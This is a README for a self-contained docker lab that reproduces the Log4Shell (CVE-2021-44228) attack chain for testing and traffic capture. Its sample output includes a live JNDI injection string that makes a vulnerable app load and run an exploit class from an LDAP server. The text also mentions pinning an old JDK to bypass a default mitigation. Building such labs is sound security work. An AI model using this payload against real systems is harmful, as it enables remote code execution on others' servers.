# Full-chain dockerized Log4Shell (CVE-2021-44228)

Log4Shell (CVE-2021-44228) is a critical vulnerability in the popular log4j2 logging package.
This vulnerability is extremely easy to exploit, and was fixed in log4j2 version 2.15.
This repository goal is to automate and construct the environment through a single click by using `docker-compose` and containers.
This could be useful for:

- Testing different java version easily.
- Testing different payloads without constructing heavy setups.
- Capturing easily the traffic for security protection measures.
- More.

The setup contains:

- `vuln` - A vulnarable code using log4j2
- `marshalsec` - An LDAP server serving the exploit to log4j JDNI request
- `http-server` - A simple python server serving the compiled exploit java class file

Further explanation can be reached here:
https://www.lunasec.io/docs/blog/log4j-zero-day/

## Usage

Build and run all the containers

```bash
sudo docker-compose up --build
```

Once everything is up and running, you could see the next message, indicating the exploit was successful:

```
marshalsec_1   | Send LDAP reference result for Exploit redirecting to http://http-server:8888/Exploit.class
vuln_1         | Hello from exploit!
vuln_1         | 17:26:26.531 [main] ERROR log4j - ${jndi:ldap://marshalsec:1389/Exploit}
```

Behind the scenes, the vulnerable code is requesting the `Exploit` class from the LDAP server, and executes it.
You can freely modify the [Exploit](exploit/Exploit.java) file to make custom exploits, or the [log4j](vuln/src/main/java/log4j.java) file to change the malicious log.

## Notes

In recent JDK version, the variable `com.sun.jndi.ldap.object.trustURLCodebase` is set to `false` by default, thus stopping effectively the attack. Thats why I set the java version to older than that.
